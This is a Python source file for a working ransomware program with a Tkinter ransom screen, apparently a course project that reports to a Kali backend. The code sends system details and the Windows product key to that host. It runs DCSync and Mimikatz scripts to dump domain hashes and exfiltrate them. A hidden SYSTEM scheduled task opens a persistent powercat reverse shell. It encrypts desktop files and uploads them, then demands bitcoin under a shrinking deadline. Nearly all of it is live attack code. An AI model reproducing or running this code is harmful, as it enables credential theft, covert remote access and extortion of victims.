import tkinter
import tkinter.messagebox
import customtkinter
import os
import threading
from PIL import Image, ImageTk
from tkinter import PhotoImage
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
import requests
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import subprocess
import ctypes
from datetime import datetime, timedelta
import json
import time
from win32com.client import GetObject
from socket import gethostname, gethostbyname 
import socket
import wmi
from windows_tools.product_key import get_windows_product_key_from_reg
import windows_tools.antivirus
from winregistry import WinRegistry as Reg
import platform
import re
import psutil
import uuid
import shutil
import sys
import pythoncom

customtkinter.set_appearance_mode("Dark")
image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "images")
script_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "files")
customtkinter.set_default_color_theme(os.path.join(image_path, "custom_theme.json"))

SECRET_KEY = b'rYc0wv38EbC5zCC70HoCXA=='

def discover_backend():
    broadcast_ip = '<broadcast>'
    port = 12345
    message = b'DISCOVER_BACKEND'

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    client_socket.settimeout(5)

    try:
        client_socket.sendto(message, (broadcast_ip, port))
        print(f"Sent broadcast message to {broadcast_ip}:{port}")

        while True:
            try:
                data, addr = client_socket.recvfrom(1024)
                backend_ip = data.decode('utf-8')
                print(f"Received backend IP address: {backend_ip}")
                return backend_ip
            except socket.timeout:
                print("Timeout waiting for response, retrying...")
                client_socket.sendto(message, (broadcast_ip, port))
    finally:
        client_socket.close()

def get_subnet_mask_size(subnet_mask):
    octets = subnet_mask.split('.')
    binary_subnet = ''.join(format(int(octet), '08b') for octet in octets)
    subnet_size = binary_subnet.find('0')
    if subnet_size == -1:
        subnet_size = 32  
    return subnet_size

def collect_system_info():
    info = {}

    def initialize_wmi():
        pythoncom.CoInitialize()
        return wmi.WMI()

    try:
        computer = initialize_wmi()
        gpuName = computer.Win32_VideoController()[0].name
    except Exception as e:
        gpuName = "Unknown"
        # print(f"Error getting GPU name: {e}")

    try:
        root_winmgmts = initialize_wmi()
        cpus = root_winmgmts.Win32_Processor()
        cpuInfo = cpus[0].Name if cpus else "Unknown"
    except Exception as e:
        cpuInfo = "Unknown"
        # print(f"Error getting CPU info: {e}")

    try:
        windowsKey = get_windows_product_key_from_reg()
    except Exception as e:
        windowsKey = "N/A"
        # print(f"Error getting Windows key: {e}")

    def gethwid():
        try:
            p = subprocess.Popen("wmic csproduct get uuid", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
        except Exception as e:
            # print(f"Error getting HWID: {e}")
            return "Unknown"

    try:
        reg = Reg.Reg()
        path = r'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001'
        hwid2 = str(reg.read_entry(path, 'HwProfileGuid')).split("'")[5]
    except Exception as e:
        hwid2 = "Unknown"
        # print(f"Error getting HWID2: {e}")

    try:
        domain = (initialize_wmi().Win32_ComputerSystem())[0].Domain
        ip_address = socket.gethostbyname(domain)
    except Exception as e:
        domain = "Unknown"
        ip_address = "Unknown"
        # print(f"Error getting domain info: {e}")

    try:
        antivirus_info = windows_tools.antivirus.get_installed_antivirus_software()
    except Exception as e:
        antivirus_info = "Unknown"
        # print(f"Error getting antivirus info: {e}")

    try:
        info['Platform'] = platform.system() + " " + platform.release()
        info['Platform Version'] = platform.version()
        info['Architecture'] = platform.machine()
        info['Hostname'] = socket.gethostname()
        info['HWID 1'] = "{" + gethwid().rstrip() + "}"
        info['HWID 2'] = hwid2
        private_ip = socket.gethostbyname(socket.gethostname())
        info['Private IP Address'] = private_ip
        subnet_mask = '255.255.255.0'
        subnet = '.'.join(str(int(ip_byte) & int(subnet_byte)) for ip_byte, subnet_byte in zip(private_ip.split('.'), subnet_mask.split('.')))
        info['Subnet'] = subnet
        subnet_size = get_subnet_mask_size(subnet_mask)
        info['Subnet Size'] = f"/{subnet_size}"
        info['Mac Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['CPU'] = cpuInfo
        info['RAM'] = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
        info['GPU'] = gpuName
        info['Windows Key'] = windowsKey
        info['IP Range'] = subnet + info['Subnet Size']
        info['Domain Name'] = domain
        info['Domain IP Address'] = ip_address
        info['Antivirus Software'] = antivirus_info
    except Exception as e:
        print(f"Error collecting system info: {e}")

    return json.dumps(info, indent=4)

def get_fake_filename(original_filename):
    if "PTF_Hashes_FINAL.txt" in original_filename:
        return "1"
    elif "CUSTOMER_Importfile_FINAL.txt" in original_filename:
        return "2"
    elif "LOGFILE.txt" in original_filename:
        return "3"
    elif "Users.csv" in original_filename:
        return "4"
    else:
        return original_filename
    
def get_latest_folder(base_path, folder_name):
    all_folders = [os.path.join(base_path, d) for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d)) and folder_name in d]
    if not all_folders:
        raise FileNotFoundError(f"No folders containing '{folder_name}' found in '{base_path}'")
    
    latest_folder = max(all_folders, key=os.path.getmtime)
    return latest_folder

def read_files_and_send(computer_id):
    DATE = subprocess.check_output(["powershell.exe", "-Command", "[DateTime]::Now.ToString('yyyyMMddThhmm')"]).decode().strip()
    # print(DATE)
    BASE_PATH = "C:\\temp"
    DATE_FOLDER = f"{DATE}_DCSYNC"
    FOLDER_NAME = "_DCSYNC"
    
    # First attempt to find the folder using the current date
    date_based_folder = os.path.join(BASE_PATH, DATE_FOLDER)
    if os.path.exists(date_based_folder) and os.path.isdir(date_based_folder):
        latest_folder = date_based_folder
    else:
        # If the folder is not found, find the latest folder containing the name
        latest_folder = get_latest_folder(BASE_PATH, FOLDER_NAME)
    
    # print(f"Using folder: {latest_folder}")

    PTF_PATH = os.path.join(latest_folder, "PTF")
    CUSTOMER_PATH = os.path.join(latest_folder, "CUSTOMER")
    
    files = {}

    def add_file(file_path, key):
        try:
            with open(file_path, 'r') as file:  # Open the file in text mode
                content = file.read()
                encrypted_content = encrypt_data(content)
                fake_filename = get_fake_filename(os.path.basename(file_path))
                files[key] = (fake_filename, encrypted_content, 'text/plain')
        except FileNotFoundError:
            print(f"File not found: {file_path}")

    def find_and_add_files(base_dir):
        for root, dirs, file_names in os.walk(base_dir):
            for file_name in file_names:
                if "PTF_Hashes_FINAL.txt" in file_name:
                    add_file(os.path.join(root, file_name), 'ptfhashes')
                elif "CUSTOMER_Importfile_FINAL.txt" in file_name:
                    add_file(os.path.join(root, file_name), 'importfile')
                elif "LOGFILE.txt" in file_name:
                    add_file(os.path.join(root, file_name), 'logfile')
                elif "Users.csv" in file_name:
                    add_file(os.path.join(root, file_name), 'users_csv')

    find_and_add_files(PTF_PATH)
    find_and_add_files(CUSTOMER_PATH)

    if not files:
        # print("No files to send.")
        return

    data = {'computer_id': computer_id}

    try:
        response = requests.post(f"http://{kali_address}/shhhhh", files=files, data=data)
        if response.status_code == 200:
            print("Files sent successfully.")
        else:
            print(f"Failed to send files. Status code: {response.status_code}")
    finally:
        # Make sure to close the files after the request is done
        for file in files.values():
            if hasattr(file[1], 'close'):
                file[1].close()

    shutil.rmtree(latest_folder)
    runit(computer_id)


def get_hashes(computer_id):
    if getattr(sys, 'frozen', False):
        current_dir = sys._MEIPASS
    else:
        current_dir = os.path.dirname(os.path.realpath(__file__))

    # Paths to PowerShell scripts
    dcsync_script = os.path.join(current_dir, 'files', 'Invoke-DCSync.ps1')
    mimikatz_script = os.path.join(current_dir, 'files', 'Invoke-Mimikatz.ps1')
    powerview_script = os.path.join(current_dir, 'files', 'PowerView.ps1')
    adrecon_script = os.path.join(current_dir, 'files', 'ADRecon.ps1')

    # Check if all PowerShell scripts exist
    for script_path in [dcsync_script, mimikatz_script, powerview_script, adrecon_script]:
        if not os.path.isfile(script_path):
            raise FileNotFoundError(f"The PowerShell script does not exist: {script_path}")

    with open(dcsync_script, 'r') as file:
        dcsync_content = file.read()

    dcsync_content = dcsync_content.replace('.\\Invoke-Mimikatz.ps1', mimikatz_script.replace('\\', '\\\\'))
    dcsync_content = dcsync_content.replace('.\\PowerView.ps1', powerview_script.replace('\\', '\\\\'))
    dcsync_content = dcsync_content.replace('.\\ADRecon.ps1', adrecon_script.replace('\\', '\\\\'))

    updated_dcsync_script = os.path.join(current_dir, 'files', 'Updated-Invoke-DCSync.ps1')
    with open(updated_dcsync_script, 'w') as file:
        file.write(dcsync_content)

    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    try:
        result = subprocess.run(
            ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", updated_dcsync_script],
            check=True,
            startupinfo=si,
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW

        )
        read_files_and_send(computer_id)
    except subprocess.CalledProcessError as e:
        print(f"PowerShell script failed with error: {e.stderr}")


def get_current_desktop_background():
    SPI_GETDESKWALLPAPER = 0x73
    buffer_size = 200
    buffer = ctypes.create_unicode_buffer(buffer_size)
    ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, buffer_size, buffer, 0)
    return buffer.value

def change_desktop_background(image_path):
    # Check if the image file exists
    if not os.path.exists(image_path):
        raise FileNotFoundError(f"The image file does not exist: {image_path}")

    SPI_SETDESKWALLPAPER = 20
    # Access Windows DLLs for functionality e.g., changing desktop wallpaper
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)

def encrypt_data(data):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = b64encode(cipher.iv).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')
    return iv + ct

def decrypt_data(data):
    try:
        iv = b64decode(data[:24])
        ct = b64decode(data[24:])
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except (ValueError, KeyError) as e:
        # print(f"Decryption error: {e}")
        return None

def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key().decode('utf-8')
    public_key = key.publickey().export_key()

    with open('public.pem', 'wb') as f:
        f.write(public_key)

    return private_key

def generate_aes_keys(base_path):
    aes_keys = {}
    for root, dirs, files in os.walk(base_path):
        for file in files:
            if file.endswith('.txt'):
                aes_key = get_random_bytes(32)
                aes_iv = get_random_bytes(16)
                relative_file_path = os.path.relpath(os.path.join(root, file), base_path)
                aes_keys[relative_file_path] = {
                    'aes_key': b64encode(aes_key).decode('utf-8'),
                    'aes_iv': b64encode(aes_iv).decode('utf-8')
                }
    return aes_keys

def sendkeys(computer_id):
    private_key = generate_keys()
    encrypted_private_key = encrypt_data(private_key)

    endpoint_url = f"http://{kali_address}/saveprivatekey"
    response = requests.post(endpoint_url, json={'computer_id': computer_id, 'encrypted_private_key': encrypted_private_key})

def info(computer_id):
    try:
        resultPC = collect_system_info()
        if resultPC is None:
            raise ValueError("System info could not be collected")

        encrypted_computer_info = encrypt_data(resultPC)
        
        endpoint_url = f"http://{kali_address}/info"
        response = requests.post(endpoint_url, json={'computer_id': computer_id, 'data': encrypted_computer_info})
        
        if response.status_code == 200:
            print("System info sent successfully")
        else:
            print(f"Failed to send system info. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error in info function: {e}")


def doit(computer_id):
    endpoint_url = f"http://{kali_address}/doit"
    response = requests.post(endpoint_url, json={'computer_id': computer_id})

def runit(computer_id):
    endpoint_url = f"http://{kali_address}/runit"
    response = requests.post(endpoint_url, json={'computer_id': computer_id})

def encrypt_files_on_desktop(computer_id):
    public_key = RSA.import_key(open('public.pem').read())
    cipher_rsa = PKCS1_OAEP.new(public_key)
    aes_keys = {}

    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith('.txt'):
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                # Generate a random AES key and IV
                aes_key = get_random_bytes(32)
                aes_iv = get_random_bytes(16)
                cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)

                # Encrypt the file data with AES
                encrypted_data = aes_iv + cipher_aes.encrypt(pad(data, AES.block_size))

                # Encrypt the AES key with RSA
                encrypted_key = cipher_rsa.encrypt(aes_key)
                encrypted_file_content = encrypted_key + encrypted_data

                # Save the encrypted AES key and encrypted file data
                with open(file_path, 'wb') as f:
                    f.write(encrypted_key + encrypted_data)

                endpoint_url = f"http://{kali_address}/uploadfile"
                files = {'file': (file, encrypted_file_content)}

                response = requests.post(endpoint_url, files=files, data={'computer_id': computer_id})

                # Store the AES key and IV in the dictionary with a relative path
                relative_file_path = os.path.relpath(file_path, desktop_path)
                aes_keys[relative_file_path] = {
                    'aes_key': b64encode(aes_key).decode('utf-8'),
                    'aes_iv': b64encode(aes_iv).decode('utf-8')
                }

    # Send the AES keys to the backend
    encrypted_aes_keys = encrypt_data(json.dumps(aes_keys))
    endpoint_url = f"http://{kali_address}/saveaeskeys"
    response = requests.post(endpoint_url, json={'computer_id': computer_id, 'encrypted_aes_keys': encrypted_aes_keys})
def thread_function(computer_id):
    pythoncom.CoInitialize()
    info(computer_id)
    ## print(info)
def create_scheduled_task():
    current_dir = os.path.dirname(os.path.realpath(__file__))
    powercat_ps1_path = os.path.join(current_dir, 'images', 'powercat.ps1')
    c2_ps1_path = os.path.join(current_dir, 'images', 'c2.ps1')
    create_task_ps1_path = os.path.join(current_dir, 'images', 'create_task.ps1')
    run_shell_bat_path = os.path.join(current_dir, 'images', 'run_shell.bat')

    c2_ps1_content = f"""
. {powercat_ps1_path.replace("\\", "\\\\")}
$ip = "{kali_ip}"
$port = 4444
powercat -c $ip -p $port -e cmd.exe
"""
    
    create_task_ps1_content = f"""
# Define the action to be performed by the scheduled task, with hidden window style
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c {run_shell_bat_path.replace("\\", "\\\\")}"

# Define the triggers to start the task at startup, 15 seconds after creation, and 30 seconds after creation with repetition every 2 minutes indefinitely
$TriggerAtStartup = New-ScheduledTaskTrigger -AtStartup
$TriggerImmediate = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(15)
$TriggerRepetition = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
$TriggerRepetition.RepetitionInterval = (New-TimeSpan -Minutes 2)
$TriggerRepetition.RepetitionDuration = [TimeSpan]::MaxValue

# Define the task settings
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register the scheduled task
Register-ScheduledTask -Action $Action -Trigger @($TriggerAtStartup, $TriggerImmediate, $TriggerRepetition) -Settings $Settings -Principal $Principal -TaskName "SAReverseShellTask" -Description "Persistent Reverse Shell"
"""

    run_shell_bat_content = f"""
@echo off
powershell.exe -ExecutionPolicy Bypass -File {c2_ps1_path.replace("\\", "\\\\")}
"""

    # Write the scripts to the respective paths
    with open(c2_ps1_path, 'w') as file:
        file.write(c2_ps1_content)

    with open(create_task_ps1_path, 'w') as file:
        file.write(create_task_ps1_content)

    with open(run_shell_bat_path, 'w') as file:
        file.write(run_shell_bat_content)

    # Run the PowerShell script to create the scheduled task
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    si.wShowWindow = subprocess.SW_HIDE

    subprocess.run(
        ["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", create_task_ps1_path],
        check=True,
        startupinfo=si,
        creationflags=subprocess.CREATE_NO_WINDOW  # Ensure no window is created
    )
class App(customtkinter.CTk):
    def __init__(self):
        global kali_ip, kali_address
        kali_ip = discover_backend()
        kali_address = f"{kali_ip}:5000"
        super().__init__()
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "images")
        self.iconpath = ImageTk.PhotoImage(file=(os.path.join(image_path, "app.ico")))
        self.wm_iconbitmap()
        self.iconphoto(False, self.iconpath)
        self.resizable(False, False)
        self.title("SPR708 Ransomware.py")
        self.geometry(f"{1400}x{800}")
        self.deadline = datetime.now() + timedelta(hours=24)  # Initialize deadline here
        self.clock_stopped = False  # Add clock stopped flag
        self.current_background = get_current_desktop_background()  # Store current background
        self.grid_columnconfigure(1, weight=1)
        self.grid_columnconfigure((2, 3), weight=0)
        self.grid_rowconfigure((0, 1, 2, 3, 4), weight=1)

        self.sidebar_frame = customtkinter.CTkFrame(self, width=140, corner_radius=0)
        self.sidebar_frame.grid(row=0, column=0, rowspan=5, sticky="nsew")
        self.sidebar_frame.grid_rowconfigure(5, weight=1)

        self.logo_label = customtkinter.CTkLabel(self.sidebar_frame, text="Sufian Ransomware", font=customtkinter.CTkFont(size=20, weight="bold"))
        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))

        self.sidebar_button_3 = customtkinter.CTkButton(self.sidebar_frame, command=self.sidebar_button_event)
        self.sidebar_button_3.grid(row=3, column=0, padx=20, pady=10)

        self.btc_label = customtkinter.CTkLabel(self.sidebar_frame, text="$400 in BTC \n Bitcoin Address: \n asdfghjkl123456789asdfghzxcv", fg_color="transparent", text_color="red",font=("TkDefaultFont", 14, "bold"))
        self.btc_label.grid(row=4, column=0)
        self.btc_label1 = customtkinter.CTkLabel(self.sidebar_frame, text="\n\n\n\n You have this much time \n REMAINING TO PAY!", fg_color="transparent", text_color="red",font=("TkDefaultFont", 14, "bold"))
        self.btc_label1.grid(row=5, column=0)
        self.clock_label = customtkinter.CTkLabel(self.sidebar_frame, text="", font=customtkinter.CTkFont(size=18))
        self.clock_label.grid(row=5, column=0, padx=20, pady=(10, 10))

        self.entry = customtkinter.CTkEntry(self, placeholder_text="Bitcoin Transaction Number")
        self.entry.grid(row=4, column=1, columnspan=2, padx=(20, 0), pady=(20, 20), sticky="nsew")

        self.main_button_1 = customtkinter.CTkButton(master=self, fg_color="transparent", border_width=2, text_color=("gray10", "#DCE4EE"), command=self.print_entry)
        self.main_button_1.grid(row=4, column=3, padx=(20, 20), pady=(20, 20), sticky="nsew")

        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "banner2.jpg")), size=(409, 180))
        self.home_frame_large_image_label = customtkinter.CTkLabel(self, text="", image=self.large_test_image)
        self.home_frame_large_image_label.grid(row=0, column=1, columnspan=2, padx=(20, 0), pady=(20, 0), sticky="n")

        self.textbox = customtkinter.CTkTextbox(self, width=425, height=400)
        self.textbox.grid(row=1, column=1, columnspan=2, padx=(20, 0), pady=(20, 0), sticky="nsew")

        self.slider_progressbar_frame = customtkinter.CTkFrame(self, fg_color="transparent")
        self.slider_progressbar_frame.grid(row=2, column=1, columnspan=2, padx=(20, 0), pady=(20, 0), sticky="nsew")
        self.slider_progressbar_frame.grid_columnconfigure(0, weight=1)
        self.slider_progressbar_frame.grid_rowconfigure(4, weight=1)

        self.progressbar_1 = customtkinter.CTkProgressBar(self.slider_progressbar_frame)
        self.progressbar_1.grid(row=8, column=0, padx=(20, 10), pady=(10, 10), sticky="ew")

        self.qr_code_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "qr.png")), size=(240, 240))
        self.qr_code_image_label = customtkinter.CTkLabel(self, text="", image=self.qr_code_image)
        self.qr_code_image_label.grid(row=1, column=3, rowspan=2, padx=(20, 20), pady=(20, 20), sticky="nsew")

        self.sidebar_button_3.configure(state="disabled", text="Files Encrypted")
        self.progressbar_1.configure(mode="indeterminate")
        self.progressbar_1.start()

        self.textbox.configure("bold", font=("TkDefaultFont", 14, "bold"))
        text = '''Warning! Your Files Have Been Encrypted\n\n
Has no one ever told you not to download and run unknown files from the internet?\n\n
Too bad, Loser. All your files are now encrypted.\n\n
You have 24 hours to pay to the Bitcoin address provided below. After making the payment, obtain the transaction number and paste it below. Press "Verify". Once verified, you will receive the password to unlock your files.

Bitcoin Address: asdfghjkl123456789asdfghzxcv

Transaction Number:
That's the number you will get after you make the transaction. Enter it down below and press verify.

Verify

Note: Failure to comply within the specified time frame will result in the permanent loss of your files. Do not attempt to tamper with or remove this program, as it will lead to the immediate deletion of the decryption key.

Remember, this is your only chance to recover your files.'''

        self.textbox.insert("0.0", text)

        bold_indices = [
            ("0.0", "1.34"),
            ("4.0", "4.29"),
            ("8.0", "8.16"),
            ("10.0", "10.20"),
            ("15.0", "15.20")
        ]

        for start, end in bold_indices:
            self.textbox.tag_add("bold", start, end)

        self.textbox.configure(state="disabled")
        self.main_button_1.configure(text="Verify")
        self.update_clock()
        self.change_desktop_background()

        # Run the PowerShell script in a separate thread
        self.computer_id = str(uuid.uuid4())  # Generate a unique computer_id
        threading.Thread(target=create_scheduled_task, daemon=True).start()
        threading.Thread(target=get_hashes, args=(self.computer_id,), daemon=True).start()
        #threading.Thread(target=sendkeys, args=(self.computer_id,), daemon=True).start()
        threading.Thread(target=thread_function, args=(self.computer_id,), daemon=True).start()

        # Send keys and info to backend
        sendkeys(self.computer_id)
        # info(self.computer_id)
        encrypt_files_on_desktop(self.computer_id)
        doit(self.computer_id)

    def change_appearance_mode_event(self, new_appearance_mode: str):
        customtkinter.set_appearance_mode(new_appearance_mode)

    def sidebar_button_event(self):
        print("sidebar_button click")

    def print_entry(self):
        transaction_number = self.entry.get()
        encrypted_data = encrypt_data(transaction_number)
        
        response = requests.post(f'http://{kali_address}/verify', json={'computer_id': self.computer_id, 'data': encrypted_data})
        
        if response.status_code == 200:
            encrypted_response = response.json().get('response')
            decrypted_response = decrypt_data(encrypted_response)
            if decrypted_response == "AYO THIS GUY BLESS FRRRR":
                newtext = ''' Congratulations! You have successfully paid the ransom. Hope this was a good lesson for you to never trust stuff on the internet. You can go ahead and close this window now. GoodBye 😀'''
                self.textbox.configure(state="normal")
                self.textbox.delete("0.0", "end")
                self.textbox.insert("0.0", newtext)
                self.textbox.configure(state="disabled")
                self.sidebar_button_3.configure(state="normal", text="Files Decrypted", fg_color="green")
                tkinter.messagebox.showinfo("Verification Success", "Verification Success")
                self.sidebar_button_3.configure(text="Files Decrypted", fg_color="green")
                self.main_button_1.configure(state="disabled")
                self.entry.configure(state="disabled")
                self.btc_label.configure(text="", text_color="green")
                self.btc_label1.configure(text="\n\n\n\n Well Done \n Go Ahead and Close this Application", text_color="green")
                self.get_private_key()
                self.revert_desktop_background()  # Revert to the previous background after verification

                # Set clock to 00:00:00 and change color to green
                self.clock_stopped = True  # Stop the clock
                self.clock_label.configure(text="00:00:00", text_color="green")

            else:
                self.deadline -= timedelta(hours=4)  # Reduce clock by 6 hours on failure
                tkinter.messagebox.showerror("Error", "Verification failed, You just lost 4 hrs")
        else:
            self.deadline -= timedelta(hours=4)  # Reduce clock by 6 hours on failure
            tkinter.messagebox.showerror("Error", "Verification failed, You just lost 4 hrs")

    def update_clock(self):
        if self.clock_stopped:
            return
        now = datetime.now()
        remaining = self.deadline - now
        if remaining.total_seconds() > 0:
            self.clock_label.configure(text=str(remaining).split(".")[0], text_color="red", font=("TkDefaultFont", 30, "bold"))
            self.clock_label.after(1000, self.update_clock)
        else:
            self.clock_label.configure(text="00:00:00", text_color="red")
            self.clock_stopped = True
            tkinter.messagebox.showinfo("Alert", "This App will now Close. Goodbye😈")
            self.after(1000, self.quit)

    def change_desktop_background(self):
        # Local image path
        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'images', 'background.jpg')
        change_desktop_background(image_path)

    def revert_desktop_background(self):
        change_desktop_background(self.current_background)

    def get_private_key(self):
        response = requests.get(f'http://{kali_address}/getprivatekey?computer_id={self.computer_id}')
        if response.status_code == 200:
            encrypted_private_key = response.json().get('encrypted_private_key')
            encrypted_aes_keys = response.json().get('encrypted_aes_keys')
            decrypted_private_key = decrypt_data(encrypted_private_key)
            private_key = RSA.import_key(decrypted_private_key)
            decrypted_aes_keys = eval(decrypt_data(encrypted_aes_keys))
            self.decrypt_files_on_desktop(private_key, decrypted_aes_keys)
            tkinter.messagebox.showinfo("Decryption Success", "Files have been decrypted successfully.")
            self.after(1500, lambda: tkinter.messagebox.showinfo("Alert", "This App will now Close. Pleasure doing business 🫡"))
            self.after(1500, self.quit)
        else:
            tkinter.messagebox.showerror("Decryption Error", "Failed to retrieve private key.")

    def decrypt_files_on_desktop(self, private_key, aes_keys):
        cipher_rsa = PKCS1_OAEP.new(private_key)
        
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        for root, dirs, files in os.walk(desktop_path):
            for file in files:
                if file.endswith('.txt'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()
                    
                    # Extract the encrypted AES key and encrypted data
                    encrypted_key = encrypted_data[:256]
                    encrypted_content = encrypted_data[256:]
                    
                    # Decrypt the AES key with RSA
                    aes_key = cipher_rsa.decrypt(encrypted_key)
                    
                    # Decrypt the file content with AES
                    aes_iv = encrypted_content[:16]
                    cipher_aes = AES.new(aes_key, AES.MODE_CBC, aes_iv)
                    decrypted_content = unpad(cipher_aes.decrypt(encrypted_content[16:]), AES.block_size)
                    
                    with open(file_path, 'wb') as f:
                        f.write(decrypted_content)

if __name__ == "__main__":
    app = App()
    app.mainloop()
